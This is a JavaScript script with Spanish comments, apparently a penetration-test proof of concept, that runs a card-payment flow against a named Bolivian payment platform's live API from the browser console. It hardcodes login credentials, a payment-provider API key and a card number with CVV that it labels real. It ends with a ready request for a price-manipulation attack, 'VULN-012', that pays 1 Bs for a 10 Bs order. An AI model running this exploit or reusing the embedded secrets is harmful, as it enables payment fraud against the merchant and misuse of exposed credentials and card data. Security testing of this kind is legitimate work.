/**
 * EJECUTAR ESTE SCRIPT EN LA CONSOLA DEL NAVEGADOR
 *
 * Instrucciones:
 * 1. Abrir https://checkout.wabi.com.bo
 * 2. Abrir DevTools (F12)
 * 3. Ir a la pestaña Console
 * 4. Copiar y pegar todo este código
 * 5. Presionar Enter
 *
 * Esto ejecutará el flujo completo y mostrará la respuesta de update-payment
 */

(async function testPaymentFlow() {
  console.log('%c🚀 WABI Payment Flow Test - Iniciando...', 'color: blue; font-size: 16px; font-weight: bold');

  try {
    // PASO 1: Autenticar
    console.log('%c[1] Autenticando...', 'color: cyan');
    const authResp = await fetch('https://api.wabi.com.bo/v1/transaction/generateToken', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: '076f7a740acf31cf9b111d4e',
        password: '0b194b147ef825c3d1281338'
      })
    });
    const { token } = await authResp.json();
    console.log('%c✓ Token obtenido', 'color: green');

    // PASO 2: Crear transacción
    console.log('%c[2] Creando transacción...', 'color: cyan');
    const txResp = await fetch('https://api.wabi.com.bo/v1/transaction/create', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        agency_id: 2,
        plattform_id: 12
      })
    });
    const transaction = await txResp.json();
    console.log('%c✓ Transacción creada:', 'color: green', transaction.id);
    console.log('  Encrypted ID:', transaction.transaction_id_encrypted);

    // PASO 3: Crear orden de pago
    console.log('%c[3] Creando orden de pago (10 Bs Tigo)...', 'color: cyan');

    const additionalCommerce = {
      account: '69320910',
      service: '11',
      sub_service: 'SINTESIS_TELECEL_PREPAGO',
      items: [{
        code: '0001',
        amount: 10.00,
        description: 'Monto a Recargar'
      }],
      first_name: 'Juan',
      last_name: 'Perez',
      nitFac: '12345678',
      nombreFac: 'Juan Perez',
      typeDocument: '1'
    };

    const orderResp = await fetch('https://api.wabi.com.bo/v1/core/order-payment/create', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        transaction_id: transaction.id,
        description: 'Pago de Servicio Síntesis',
        service_code: 'SINTESIS_TELECEL_PREPAGO',
        debtor_first_name: 'Juan',
        debtor_last_name: 'Perez',
        debtor_phone: '',
        debtor_ci_code: '12345678',
        invoice_name: 'Juan Perez',
        invoice_type: '1',
        invoice_document_number: '12345678',
        additional_data: '{}',
        additional_commerce: JSON.stringify(additionalCommerce),
        is_billable: 1,
        amount: {
          currency: 'Bs',
          value: '10.00'
        },
        items: [{
          description: 'Monto a Recargar',
          unit_price: '10.00',
          quantity: '1',
          discount: '0.00',
          detail_type: '1'
        }]
      })
    });
    const orderPayment = await orderResp.json();
    console.log('%c✓ Orden creada:', 'color: green', orderPayment.id);

    // PASO 4: Tokenizar tarjeta REAL
    console.log('%c[4] Tokenizando tarjeta real (4218...2877)...', 'color: cyan');
    const tokenResp = await fetch('https://ppmcc.dlocal.com/v1/tokens', {
      method: 'POST',
      headers: {
        'X-API-Key': '3173e25d-501e-4189-aed1-9a7bfac64f30',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        holder_name: 'JUAN PEREZ',
        card_number: '4218284015172877',
        cvv: '007',
        expiration_month: 7,
        expiration_year: 2029,
        type: 'card'
      })
    });
    const tokenData = await tokenResp.json();
    const cardToken = tokenData.token || tokenData.id;
    console.log('%c✓ Tarjeta tokenizada:', 'color: green', cardToken);

    // PASO 5: PROCESAR PAGO
    console.log('%c═══════════════════════════════════════════════════════', 'color: magenta; font-size: 14px');
    console.log('%c[5] PROCESANDO PAGO - update-payment', 'color: magenta; font-size: 14px; font-weight: bold');
    console.log('%c═══════════════════════════════════════════════════════', 'color: magenta; font-size: 14px');

    const paymentPayload = {
      transaction_id: parseInt(transaction.id),
      transaction_id_encrypted: transaction.transaction_id_encrypted,
      payment_id: orderPayment.id,
      amount: {
        currency: 'Bs.',
        value: 10  // MONTO CORRECTO para control
      },
      token: cardToken,
      titular_name: 'JUAN PEREZ',
      payment_method: {
        type: 'CARD_PAYMENT'
      }
    };

    console.log('Payload:', paymentPayload);

    const paymentResp = await fetch('https://api.wabi.com.bo/v1/payment/card-payment/update-payment', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(paymentPayload)
    });

    const paymentResult = await paymentResp.json();

    console.log('%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
    console.log('%c✅ RESPUESTA DE update-payment:', 'color: green; font-size: 14px; font-weight: bold');
    console.log('%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
    console.log(paymentResult);

    // Analizar status code
    const statusCode = paymentResult.status_code || paymentResult.additionalData?.status_code;
    const statusDetail = paymentResult.status_detail || paymentResult.additionalData?.status_detail;

    console.log('%c📊 ANÁLISIS:', 'color: cyan; font-size: 13px; font-weight: bold');
    console.log('Status:', paymentResult.status);
    console.log('Status Code:', statusCode);
    console.log('Detail:', statusDetail);
    console.log('Payment ID:', paymentResult.paymentId);
    console.log('Amount:', paymentResult.amount, paymentResult.currency);

    if (paymentResult.card) {
      console.log('Tarjeta:', paymentResult.card);
    }

    // Interpretación del código
    const meanings = {
      '100': '⏳ PENDING',
      '200': '✅ PAID',
      '300': '❌ REJECTED',
      '302': '❌ REJECTED - Insufficient amount',
      '600': '✅ AUTHORIZED',
      '700': '✅ VERIFIED'
    };

    console.log('%c' + (meanings[statusCode] || '❓ Unknown'), 'color: yellow; font-size: 13px');

    // PASO 6: TEST DE MANIPULACIÓN DE MONTO (OPCIONAL)
    console.log('\n%c⚠️  Para probar VULN-012 (manipulación de monto):', 'color: orange; font-weight: bold');
    console.log('Cambia el payload.amount.value a 1 (en lugar de 10) y vuelve a ejecutar el paso 5');
    console.log('Si el pago se procesa con 1 Bs → VULNERABILIDAD CONFIRMADA');

    return paymentResult;

  } catch (error) {
    console.error('%c❌ Error:', 'color: red; font-weight: bold', error);
    throw error;
  }
})();

/*
═══════════════════════════════════════════════════════════════════
INSTRUCCIONES PARA PROBAR VULN-012:

Después de ejecutar este script exitosamente, modifica y ejecuta esto:

// TEST: Pagar 1 Bs por una orden de 10 Bs
await fetch('https://api.wabi.com.bo/v1/payment/card-payment/update-payment', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer <TOKEN_DEL_PASO_1>',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    transaction_id: <TRANSACTION_ID>,
    transaction_id_encrypted: '<ENCRYPTED_ID>',
    payment_id: '<ORDER_PAYMENT_ID>',
    amount: {
      currency: 'Bs.',
      value: 1  // ← MONTO MANIPULADO (orden es de 10 Bs)
    },
    token: '<CARD_TOKEN>',
    titular_name: 'JUAN PEREZ',
    payment_method: { type: 'CARD_PAYMENT' }
  })
}).then(r => r.json()).then(console.log);

Si el status_code es 302 (Insufficient amount) → Backend SÍ valida ✅
Si el pago se procesa exitosamente → VULNERABILIDAD CRÍTICA ❌
═══════════════════════════════════════════════════════════════════
*/
